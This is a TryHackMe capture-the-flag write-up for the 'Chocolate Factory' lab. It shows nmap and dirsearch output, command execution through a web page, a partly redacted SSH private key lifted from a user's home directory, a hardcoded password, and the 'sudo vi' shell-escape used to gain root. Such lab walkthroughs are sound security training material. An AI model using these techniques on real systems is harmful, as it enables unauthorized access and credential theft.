

# THM | Chocolate Factory



![](writeup.assets/image-20210120224703396.png)



## Table of content : 

[TOC]

------



## Task 1 : Introduction

in this first task , you have nothings to do but deploy the machine and connect with your vpn to TryHackMe network.

```bash
sudo openvpn ${your-username}.ovpn
```

![image-20210120224353016](writeup.assets/image-20210120224353016.png)

## Task 2 : challenges

After connecting with your vpn to THM network. here is what is demanding from you to complete this room .

![image-20210120225425615](writeup.assets/image-20210120225425615.png)

So Let's get started :

### Nmap  scan:



```bash
└──╼ $nmap -A -v 10.10.88.29
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-20 22:57 +01
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating NSE at 22:57
Completed NSE at 22:57, 0.00s elapsed
Initiating Ping Scan at 22:57
Scanning 10.10.88.29 [2 ports]
Completed Ping Scan at 22:57, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:57
Completed Parallel DNS resolution of 1 host. at 22:57, 0.09s elapsed
Initiating Connect Scan at 22:57
Scanning 10.10.88.29 [1000 ports]
Discovered open port 111/tcp on 10.10.88.29
Discovered open port 110/tcp on 10.10.88.29
Discovered open port 22/tcp on 10.10.88.29
Discovered open port 80/tcp on 10.10.88.29
Discovered open port 21/tcp on 10.10.88.29
Discovered open port 113/tcp on 10.10.88.29
Discovered open port 109/tcp on 10.10.88.29
Discovered open port 125/tcp on 10.10.88.29
Discovered open port 119/tcp on 10.10.88.29
Discovered open port 106/tcp on 10.10.88.29
Increasing send delay for 10.10.88.29 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 100/tcp on 10.10.88.29
Completed Connect Scan at 22:58, 21.40s elapsed (1000 total ports)
Initiating Service scan at 22:58
Scanning 11 services on 10.10.88.29
Service scan Timing: About 36.36% done; ETC: 23:03 (0:03:35 remaining)
Completed Service scan at 23:00, 126.44s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.88.29.
Initiating NSE at 23:00
Completed NSE at 23:02, 122.70s elapsed
Initiating NSE at 23:02
Completed NSE at 23:03, 105.68s elapsed
Initiating NSE at 23:03
Completed NSE at 23:03, 0.00s elapsed
Nmap scan report for 10.10.88.29
Host is up (0.092s latency).
Not shown: 989 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.29 (Ubuntu)
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, RTSPRequest: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   HTTPOptions, LDAPSearchReq, RPCCheck: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 23:03
Completed NSE at 23:03, 0.00s elapsed
Initiating NSE at 23:03
Completed NSE at 23:03, 0.00s elapsed
Initiating NSE at 23:03
Completed NSE at 23:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 377.00 seconds

```

we have many ports open . let's check the port 80 for http :

![image-20210120230021694](writeup.assets/image-20210120230021694.png)

we have this html page that require a username and password . I tried to brute-force the loging using intruder in BurpSuite . but doesn't work .

### Dirsearch : 

I tried to fuzz the directory of this website using dirsearch with his default wordlist :

```bash
──╼ $dirsearch -u 10.10.88.29 -e *

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: Chocolate_Factory | HTTP method: GET | Threads: 20 | Wordlist size: 7140

Error Log: /home/itatshi/Desktop/tools/dirsearch/logs/errors-21-01-20_23-02-29.log

Target: http://10.10.88.29/

Output File: /home/itatshi/Desktop/tools/dirsearch/reports/10.10.88.29/_21-01-20_23-02-29.txt

[23:02:29] Starting: 
[23:02:35] 403 -  276B  - /.htaccess.orig
[23:02:35] 403 -  276B  - /.htaccess.bak1
[23:02:35] 403 -  276B  - /.htaccess.sample
[23:02:35] 403 -  276B  - /.htaccess.save
[23:02:35] 403 -  276B  - /.htaccessBAK
[23:02:35] 403 -  276B  - /.htaccessOLD
[23:02:35] 403 -  276B  - /.htaccessOLD2
[23:02:35] 403 -  276B  - /.htm
[23:02:35] 403 -  276B  - /.html
[23:02:35] 403 -  276B  - /.httr-oauth
[23:02:36] 403 -  276B  - /.php
[23:03:04] 200 -  569B  - /home.php
[23:03:05] 200 -    1KB - /index.html
[23:03:05] 200 -  273B  - /index.php.bak
[23:03:15] 403 -  276B  - /server-status/
[23:03:15] 403 -  276B  - /server-status

Task Completed

```

Browsing to */home.php* . we found a place where we can execute some command to the systeme where the http server is running .

![image-20210120230622761](writeup.assets/image-20210120230622761.png)

By running ls command , we could list all files and directories in the current directory.

![image-20210120230831029](writeup.assets/image-20210120230831029.png)

By running the following command , we can answer the first question of this Task :

```bash
cat key_rev_key
```

after that , Inspect the page code source to see the things obviously .

![image-20210120231332131](writeup.assets/image-20210120231332131.png)



By browsing to home/charlie directory via the same html page  :

![image-20210120231858974](writeup.assets/image-20210120231858974.png)

we could see :

![image-20210120231924968](writeup.assets/image-20210120231924968.png)

 after reading what is inside those files. we discovered that those files are ssh public and private key of charlie user .

let's copy and paste the private key "*teleport*" into our attacker machine directory .

![image-20210120232422347](writeup.assets/image-20210120232422347.png)

![image-20210120232501418](writeup.assets/image-20210120232501418.png)

```bash
└──╼ $cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8**************************************************************
*****************************************kzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----

```

after that we changed the permission of that file  , and then we could be able to ssh charlie user successfully:

```bash
└──╼ $chmod 600 id_rsa 
┌─[itatshi@parrot]─[~/THM/Chocolate_Factory]
└──╼ $ssh -i id_rsa charlie@10.10.88.29
The authenticity of host '10.10.88.29 (10.10.88.29)' can't be established.
ECDSA key fingerprint is SHA256:gd9u+ZN0RoEwz95lGsM97tRG/YPtIg9MwOxswHac8yM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.88.29' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 20 22:29:54 UTC 2021

  System load:  0.0               Processes:           597
  Usage of /:   43.6% of 8.79GB   Users logged in:     0
  Memory usage: 61%               IP address for eth0: 10.10.88.29
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
Could not chdir to home directory /home/charley: No such file or directory
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

charlie@chocolate-factory:/$ 
```

as you can see , we could successfully connect to charlie user using ssh .

let's now get the user flag : 

```bash
charlie@chocolate-factory:/$ ls
bin   cdrom  etc   initrd.img	   lib	  lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
charlie@chocolate-factory:/$ cd /home/charlie/
charlie@chocolate-factory:/home/charlie$ ls
teleport  teleport.pub	user.txt
charlie@chocolate-factory:/home/charlie$ cat user.txt 
flag{cd55090***************22d2e} 
charlie@chocolate-factory:/home/charlie$ 

```

we got successfully the user flag . but we need also his password .

let's go to the directory where http is running . and see what is inside it :

```bash
charlie@chocolate-factory:/home/charlie$ cd /var/www/html/
charlie@chocolate-factory:/var/www/html$ ls
home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
```

after reading those files , we found the password in validate.php file .

```bash
charlie@chocolate-factory:/var/www/html$ cat validate.php 
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
?>charlie@chocolate-factory:/var/www/html$ 
```

so , as you can see , the password is in the fourth line .

### Privilege escalation :

let's now get the root flag by escalate the privilege from user to root .

By running sudo -l . we see that charlie can run the vi as a super user .

```bash
charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/$ 

```

let's exploit it .

Browe to this website [https://gtfobins.github.io/](https://gtfobins.github.io/) and search for vi bin exploit :

![image-20210120234603674](writeup.assets/image-20210120234603674.png)

so , this line was the exploit of the vi bin :) .

let's get the root flag now .

```bash
charlie@chocolate-factory:/$     sudo vi -c ':!/bin/sh' /dev/null

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root      
# ls
root.py
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
# 

```

so the root flag was python file , but this python file is able to generate our root flag :).

and as you can see , he need a key , yes it's the key of the first question . 

let's get it finally .

```bash
print(mess)# python root.py
Enter the key:  b'-VkgXh********C6YR-SZbiuSb8********cGSQzY='
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec591******************296b42124}
# 
```

Boom , we got it :) .

That's all for this easy room.

